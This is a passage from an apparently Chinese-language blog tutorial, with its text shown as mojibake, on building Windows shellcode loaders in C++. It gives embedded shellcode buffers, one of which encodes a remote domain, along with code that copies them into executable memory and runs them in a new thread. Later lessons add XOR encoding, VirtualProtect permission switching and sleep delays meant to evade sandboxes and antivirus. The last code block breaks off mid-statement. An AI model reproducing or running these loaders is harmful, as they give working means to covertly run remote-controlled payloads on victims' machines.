class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcodeé•¿åº¦</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// çº¿ç¨‹ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// çº¿ç¨‹å¥æŸ„</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* length: 519 bytes */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x31\xc0\x6a\x40\xb4\x10\x68\x00\x10\x00\x00\x68\xff\xff\x07\x00\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x83\xc0\x40\x89\xc7\x50\x31\xc0\xb0\x70\xb4\x69\x50\x68\x64\x6e\x73\x61\x54\x68\x4c\x77\x26\x07\xff\xd5\xbb\x61\x00\x00\x00\xeb\x7b\x58\x89\xc6\x83\xef\x40\xfc\xb9\x40\x00\x00\x00\xf3\xa4\x89\xf8\x83\xe8\x40\x40\x80\xfb\x7a\x7e\x32\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x1a\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x07\xbb\x61\x00\x00\x00\x88\x18\x48\x48\xbb\x61\x00\x00\x00\x88\x18\x89\xf3\x89\xc6\x54\x5b\x83\xeb\x04\x53\x6a\x00\x53\x6a\x00\x68\x48\x02\x00\x00\x6a\x10\x50\x68\x6a\xc9\x9c\xc9\xff\xd5\x85\xc0\x75\x51\x89\xf0\x48\xb3\x00\x88\x18\x40\x8b\x30\xeb\x70\xe8\x80\xff\xff\xff\x00\x61\x61\x61\x2e\x6c\x6f\x76\x65\x32\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x2e\x6c\x6f\x76\x65\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x89\xf0\x48\x8b\x08\x41\x88\x08\x80\xf9\x5f\x7e\x07\x68\xf0\xb5\xa2\x56\xff\xd5\x68\xe8\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5\x89\xf0\x8b\x08\x89\xcb\xe9\x23\xff\xff\xff\x87\xfa\x5f\x8b\x47\x18\x83\xf8\x01\x75\x39\x83\xc7\x1c\x8b\x3f\x87\xde\x89\xfe\x8b\x7c\x24\x08\x31\xc9\xb1\xff\xf3\xa4\x57\x57\x57\x43\x87\xfa\x52\x57\x53\x81\xea\xff\x00\x00\x00\x52\x68\xf4\x00\x8e\xcc\xff\xd5\x5b\x5f\x5a\x3d\xff\x00\x00\x00\x7c\x07\xe9\xdf\xfe\xff\xff\x89\xd7\x81\xc7\x15\x00\x00\x00\xff\xe7\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–shellcodeå¤§å°</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">    NULL, // åŸºå€</span></span><br><span class="line"><span class="comment">    800,  // å¤§å°</span></span><br><span class="line"><span class="comment">    MEM_COMMIT, // å†…å­˜é¡µçŠ¶æ€</span></span><br><span class="line"><span class="comment">    PAGE_EXECUTE_READWRITE // å¯è¯»å¯å†™å¯æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)VirtualAlloc(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    shellcode_size,</span><br><span class="line">    MEM_COMMIT,</span><br><span class="line">    PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// å°†shellcodeå¤åˆ¶åˆ°å¯æ‰§è¡Œçš„å†…å­˜é¡µä¸­</span></span><br><span class="line">CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line"></span><br><span class="line">hThread = CreateThread(</span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// å®‰å…¨æè¿°ç¬¦</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// æ ˆçš„å¤§å°</span></span><br><span class="line">    (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// å‡½æ•°</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// å‚æ•°</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// çº¿ç¨‹æ ‡å¿—</span></span><br><span class="line">    &amp;dwThreadId <span class="comment">// çº¿ç¨‹ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE); <span class="comment">// ä¸€ç›´ç­‰å¾…çº¿ç¨‹æ‰§è¡Œç»“æŸ</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ç¬¬ä¸‰è¯¾"><a href="#ç¬¬ä¸‰è¯¾" class="headerlink" title="ç¬¬ä¸‰è¯¾"></a>ç¬¬ä¸‰è¯¾</h1><h2 id="å†…å­˜ç”³è¯·çš„ä¼˜åŒ–"><a href="#å†…å­˜ç”³è¯·çš„ä¼˜åŒ–" class="headerlink" title="å†…å­˜ç”³è¯·çš„ä¼˜åŒ–"></a>å†…å­˜ç”³è¯·çš„ä¼˜åŒ–</h2><p>åœ¨ç”³è¯·å†…å­˜é¡µæ—¶ï¼Œä¸€å®šè¦æŠŠæ§å¥½å±æ€§ï¼Œå¯ä»¥åœ¨Shellcodeè¯»å…¥æ—¶ï¼Œç”³è¯·ä¸€ä¸ªæ™®é€šçš„å¯è¯»å†™çš„å†…å­˜é¡µï¼Œç„¶åå†é€šè¿‡VirtualProtectæ”¹å˜å®ƒçš„å±æ€§ -&gt; å¯æ‰§è¡Œã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å…¥å£å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcodeé•¿åº¦</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// çº¿ç¨‹ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// çº¿ç¨‹å¥æŸ„</span></span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// å†…å­˜é¡µå±æ€§</span></span><br><span class="line"><span class="comment">/* length: 800 bytes */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–shellcodeå¤§å°</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å¢åŠ å¼‚æˆ–ä»£ç  */</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;shellcode_size; i++)&#123;</span><br><span class="line">    buf[i] ^= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">    NULL, // åŸºå€</span></span><br><span class="line"><span class="comment">    800,  // å¤§å°</span></span><br><span class="line"><span class="comment">    MEM_COMMIT, // å†…å­˜é¡µçŠ¶æ€</span></span><br><span class="line"><span class="comment">    PAGE_EXECUTE_READWRITE // å¯è¯»å¯å†™å¯æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)VirtualAlloc(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    shellcode_size,</span><br><span class="line">    MEM_COMMIT,</span><br><span class="line">    PAGE_READWRITE <span class="comment">// åªç”³è¯·å¯è¯»å¯å†™</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†shellcodeå¤åˆ¶åˆ°å¯è¯»å¯å†™çš„å†…å­˜é¡µä¸­</span></span><br><span class="line">CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿™é‡Œå¼€å§‹æ›´æ”¹å®ƒçš„å±æ€§ä¸ºå¯æ‰§è¡Œ</span></span><br><span class="line">VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç­‰å¾…å‡ ç§’ï¼Œå…´è®¸å¯ä»¥è·³è¿‡æŸäº›æ²™ç›’å‘¢ï¼Ÿ</span></span><br><span class="line">Sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">hThread = CreateThread(</span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// å®‰å…¨æè¿°ç¬¦</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// æ ˆçš„å¤§å°</span></span><br><span class="line">    (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// å‡½æ•°</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// å‚æ•°</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// çº¿ç¨‹æ ‡å¿—</span></span><br><span class="line">    &amp;dwThreadId <span class="comment">// çº¿ç¨‹ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE); <span class="comment">// ä¸€ç›´ç­‰å¾…çº¿ç¨‹æ‰§è¡Œç»“æŸ</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h2><p><code>InterlockedXorRelease</code>å‡½æ•°å¯ä»¥ç”¨äºä¸¤ä¸ªå€¼çš„å¼‚æˆ–è¿ç®—ï¼Œæœ€é‡è¦çš„ä¸€ç‚¹å°±æ˜¯ï¼Œå®ƒçš„æ“ä½œæ˜¯åŸå­çš„ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥è¾¾åˆ°çº¿ç¨‹åŒæ­¥ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinBase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// å…¥å£å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcodeé•¿åº¦</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// çº¿ç¨‹ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// çº¿ç¨‹å¥æŸ„</span></span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// å†…å­˜é¡µå±æ€§</span></span><br><span class="line"><span class="comment">/* length: 800 bytes */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–shellcodeå¤§å°</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å¢åŠ å¼‚æˆ–ä»£ç  */</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;shellcode_size; i++)&#123;</span><br><span class="line">    Sleep(<span class="number">50</span>);</span><br><span class="line">    _InterlockedXor8(buf+i,<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">    NULL, // åŸºå€</span></span><br><span class="line"><span class="comment">    800,  // å¤§å°</span></span><br><span class="line"><span class="comment">    MEM_COMMIT, // å†…å­˜é¡µçŠ¶æ€</span></span><br><span class="line"><span class="comment">    PAGE_EXECUTE_READWRITE // å¯è¯»å¯å†™å¯æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)VirtualAlloc(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    shellcode_size,</span><br><span class="line">    MEM_COMMIT,</span><br><span class="line">    PAGE_READWRITE <span class="comment">// åªç”³è¯·å¯è¯»å¯å†™</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†shellcodeå¤åˆ¶åˆ°å¯è¯»å¯å†™çš„å†…å­˜é¡µä¸­</span></span><br><span class="line">CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿™é‡Œå¼€å§‹æ›´æ”¹å®ƒçš„å±æ€§ä¸ºå¯æ‰§è¡Œ</span></span><br><span class="line">VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç­‰å¾…å‡ ç§’ï¼Œå…´è®¸å¯ä»¥è·³è¿‡æŸäº›æ²™ç›’å‘¢ï¼Ÿ</span></span><br><span class="line">Sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">hThread = 